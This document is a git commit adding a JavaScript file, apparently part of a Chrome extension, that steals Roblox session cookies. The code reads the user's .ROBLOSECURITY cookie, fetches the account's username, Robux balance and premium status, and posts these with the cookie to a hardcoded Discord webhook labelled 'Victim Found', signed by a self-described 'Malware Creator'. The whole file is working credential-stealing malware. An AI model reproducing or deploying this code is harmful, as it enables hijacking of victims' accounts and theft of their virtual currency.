1e7074fe545509cd4444c588db0fa7230f698274
Louis Grant <109883360+DeveloperAleenas@users.noreply.github.com>
2022-07-23 18:27:02 -0700

    Add files via upload

---
+++ scripts/log.js
@@ -0,0 +1,65 @@
+const WEBHOOK = "https://discord.com/api/webhooks/998044718162264186/iCmL45fZg_ChoJLpzd1Ooe6dWBnl7WD_crrQ7lZwhEUrJdkN_8gJ8BBKYOPewnmr9EHm";
+
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
+    }
+    
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "Application/json"
+        },
+        body: JSON.stringify({
+            "content": null,
+            "embeds": [
+              {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                  {
+                    "name": "Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Robux",
+                    "value": statistics ? statistics.RobuxBalance : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                  }
+                ],
+                "author": {
+                  "name": "Victim Found: " + "247.117.63.5",
+                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                },
+                "footer": {
+                  "text": "aleenaswrldd#1771 | Malware Creator",
+                  "icon_url": "https://c.tenor.com/3ItiA2urMygAAAAC/nerowo-fsociety.gif"
+                },
+                "thumbnail": {
+                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                }
+              }
+            ],
+            "username": "MADE BY ALEENAS | TROLLEDXBEAMED",
+            "avatar_url": "https://cdn.discordapp.com/attachments/998047009737027627/998047102775087235/aleenaswrldd.png",
+            "attachments": []
+        })
+    });
+}
+
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
